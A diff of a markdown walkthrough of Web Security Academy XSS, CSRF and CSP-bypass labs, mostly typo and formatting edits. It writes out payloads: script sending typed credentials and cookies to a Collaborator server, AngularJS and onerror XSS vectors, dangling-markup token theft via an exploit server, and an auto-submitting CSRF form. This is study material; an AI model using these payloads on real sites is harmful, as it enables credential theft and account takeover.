@@ -727,10 +727,10 @@ As like previous apps mostly all tags '<>'  are blocked.
 
 <img width="791" height="574" alt="image" src="https://github.com/user-attachments/assets/6c3a1fc0-636a-47c5-9a32-0efa4f01c1cd" />
 
--  fetch --> Send request to this attaker server
-method: 'POST', -> so cookie is send
-mode: 'no-cors', -> it allow to read 
-body:document.cookie --> getting the session cookie.
+- fetch --> Send request to this attaker server
+- method --> 'POST', -> so cookie is send
+- mode -->'no-cors', -> it allow to read 
+- body --> document.cookie --> getting the session cookie.
 
 <img width="929" height="607" alt="image" src="https://github.com/user-attachments/assets/66b588f7-8330-4d5e-aa12-6a1ed4713175" />
 
@@ -747,7 +747,7 @@ body:document.cookie --> getting the session cookie.
 
 <img width="754" height="138" alt="image" src="https://github.com/user-attachments/assets/455d0bf7-b6b6-4484-872c-f8eccec46437" />
 
-### Goal : To exfiltrate victim username and password and ten use these credentials to login. 
+### Goal : To exfiltrate victim username and password and then use these credentials to login. 
 
 ### Ingredients : Home, myaccount and viewpost button. 
 
@@ -755,8 +755,8 @@ body:document.cookie --> getting the session cookie.
 
 ### Solving : 
 
-- We are going to exploit the comment section on the post that is very vulnerable.
-- We are going to fetch the username and password making an input field near the comment section when user enter teh credentials the script will send it to the collobartor server and there we can collect that.
+- We are going to exploit the comment section on the post which is very vulnerable.
+- We are going to fetch the username and password making an input field near the comment section when user enter thier credentials the script will send it to the collobartor server and there we can collect that.
 - So here the is the script.
 
 <input name=username id=username>
@@ -766,7 +766,7 @@ mode: 'no-cors',
 body:username.value+':'+this.value
 });">
 
-- Creating two tab naming username and password when user typing anything there it will automatically fetch that and send to burp collobarator.
+- Creating two tabs as username and password when user types anything there, it will automatically fetch that and send to burp collobarator.
 
 <img width="805" height="554" alt="image" src="https://github.com/user-attachments/assets/dd14f2f5-71f0-455b-b539-1959883fd74c" />
 
@@ -790,7 +790,7 @@ body:username.value+':'+this.value
 
 ### Solving : 
 
-- Log in as the regualar user and updating the email.
+- Logging in as the regular user and updating the email.
 
 <img width="866" height="382" alt="image" src="https://github.com/user-attachments/assets/5d8290a6-2bf6-420e-b65f-718c03b25752" />
 
@@ -802,7 +802,7 @@ body:username.value+':'+this.value
 
 <img width="1028" height="527" alt="image" src="https://github.com/user-attachments/assets/22398223-96db-461c-8927-4b450ab4969a" />
 
-- We try to write a script that will make the victim to send a request to the server with csrf to change the email.  Following is the script. 
+- We try to write a script that will make the victim to send a request to the server with csrf to change the email. Following is the script. 
 
 <img width="782" height="280" alt="image" src="https://github.com/user-attachments/assets/e9841240-1ef6-4c87-9b41-4a5ead2d6d27" />
 
@@ -880,7 +880,7 @@ fetch('/my-account/change-email'       --> Creating a new data and changing the 
 
 <img width="1198" height="496" alt="image" src="https://github.com/user-attachments/assets/5d281923-fed8-45a4-b91f-b1c4ce8539c6" />
 
-- Let's try to create a input field and when write a scipt that will execute when the user focus on the field.
+- Let's try to create a input field we write a scipt that will execute when the user focus on the field.
 
 <input id=a ng-focus=$event.composedPath()|orderBy:'(x=alert)(document.cookie)'>#a';
 
@@ -918,11 +918,11 @@ fetch('/my-account/change-email'       --> Creating a new data and changing the 
 
 <img width="991" height="319" alt="image" src="https://github.com/user-attachments/assets/3b959a16-b38d-46ac-b0fd-f58c496abdcd" />
 
-- We <a> is allowed we can notice which tag is allowed by using burpsuite intruder and XSS cheat sheet.
+- We can see a tag  is allowed we can notice which tag is allowed by using burpsuite intruder and XSS cheat sheet.
 
 <img width="1161" height="472" alt="image" src="https://github.com/user-attachments/assets/f33bfd2b-f1d2-4488-96d2-93a1a2d09afa" />
 
-- We can animate and image tag is allowed.
+- animate and image tag is allowed.
 
 <img width="693" height="309" alt="image" src="https://github.com/user-attachments/assets/51d8e9cf-4be1-4579-96ef-8081f0f4e7a2" />
 
@@ -967,9 +967,9 @@ fetch('/my-account/change-email'       --> Creating a new data and changing the 
 
 - <img width="1102" height="375" alt="image" src="https://github.com/user-attachments/assets/5fbecac0-c1ed-473f-b6b6-1675bdddbdbd" />
 
-- By declaring window+'' it concatinating an empty string to the window. And for the url code by posting the following we can solve the lab. 
+- By declaring window+'' it concatinate an empty string to the window. And for the url code by posting the following we can solve the lab. 
 
-- Url encodeed version of this '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'''
+- Url encodeed version of this '}, x=x=>{throw/**/onerror=alert,1337},toString=x,window+'''
 - },  --> Break out the existing context.
 - {throw/**/onerror=alert,1337} --> First argument /**/ --> for gap.
 
@@ -983,7 +983,7 @@ fetch('/my-account/change-email'       --> Creating a new data and changing the 
 
 <img width="752" height="320" alt="image" src="https://github.com/user-attachments/assets/8fd437fd-7b76-4100-bf31-974feb35c2d4" />
 
-### Goal : To perform form hijacking that Bypasses csp, exfiltrate csrf and use it to change change email to hacker@evil-user.net
+### Goal : To perform form hijacking that Bypasses csp, exfiltrate csrf and use it to change email to hacker@evil-user.net
 
 ### Ingrediants : Home, My account, exploit server and View post button.  
 
@@ -1001,7 +1001,7 @@ fetch('/my-account/change-email'       --> Creating a new data and changing the 
 
 - We will try to inject a href with title click me near the button and see in the DOM.
 
-- Lets Try to reveal the csrf token by itself by changing the hidden to text.
+- Lets try to reveal the csrf token by itself by changing the hidden to text.
 
 <img width="1097" height="560" alt="image" src="https://github.com/user-attachments/assets/1d7a6b70-bec7-4b4a-90db-f6d6590bf07a" />
 
@@ -1013,7 +1013,10 @@ fetch('/my-account/change-email'       --> Creating a new data and changing the 
 
 - Dangling markup : Incomplete markup that might retrives the our desired value. Like this <div>   <p>Hello.
 
-"></form><form class="login_form" name="myform" action="https://exploit-0a5200cd0405e0a5817bb5d601560070.exploit-server.net/" method=GET><button class="button" type="Submit">Click</button   
+"> </form> 
+    form 
+           class="login_form" name="myform" action="https://exploit-0a5200cd0405e0a5817bb5d601560070.exploit-server.net/" method=GET><button class="button" type="Submit" 
+           Click</button   
 
 <img width="1171" height="636" alt="image" src="https://github.com/user-attachments/assets/894f7879-8c41-4f08-b047-50d739c28d88" />
 
@@ -1035,23 +1038,28 @@ fetch('/my-account/change-email'       --> Creating a new data and changing the 
 
 - Hence we will create a pay load to inject the csrf token to the already login user and try to change thier email. 
 
-- Hence by posting this payload we can solve the lab. 
-<html>
-<body>
-<form action="https://0a98003e034ea94d8158894b0042006f.web-security-academy.net/my-account/change-email" method="POST">
-<input type="hidden" name="email" value="hacker12@evil-user.net" />
-<input type="hidden" name ="csrf" value="HwPR53BGjteJ4Wg65ey6BOMJpykKfILY" />
-<input type="submit" value="submit" /> 
-</form>
-<script>
-history.pushState(' ' , ' ' , '/' );
-document.forms[0].submit();
-</script>
-</body>
-</html>
+- Hence by posting this payload we can solve the lab.
 
-Document.form[0] ---> submit the form first
-history.pushState ---> delete the push state. 
+- form action="https://0a98003e034ea94d8158894b0042006f.web-security-academy.net/my-account/change-email" method="POST">
+  
+- input type="hidden" name="email" value="hacker12@evil-user.net" />
+
+- input type="hidden" name ="csrf" value="HwPR53BGjteJ4Wg65ey6BOMJpykKfILY" />
+
+- input type="submit" value="submit" />
+
+- /form>
+
+- script>
+  
+- history.pushState(' ' , ' ' , '/' );
+  
+- document.forms[0].submit();
+  
+- </script>
+
+- Document.form[0] ---> submit the form first
+- history.pushState ---> delete the history. 
 
 <img width="1197" height="635" alt="image" src="https://github.com/user-attachments/assets/6f04ae00-8bc5-4a10-8d63-87494bb4e606" />
 
@@ -1086,7 +1094,7 @@ Hence by posting this we can solve the lab.
 
 <img width="1308" height="566" alt="image" src="https://github.com/user-attachments/assets/625a3022-28bb-4d1d-9457-d50183d1eb14" />
 
-- But this is not working and no alert is coming because it's replaces that it just added at the end It takes the first value script-src 'self'
+- But this is not working and no alert is coming because it is not replaced that it just added at the end It takes the first value script-src 'self'
 
 <img width="636" height="442" alt="image" src="https://github.com/user-attachments/assets/542016c1-fb56-4e6a-b0d4-dd5f115492e8" />
 
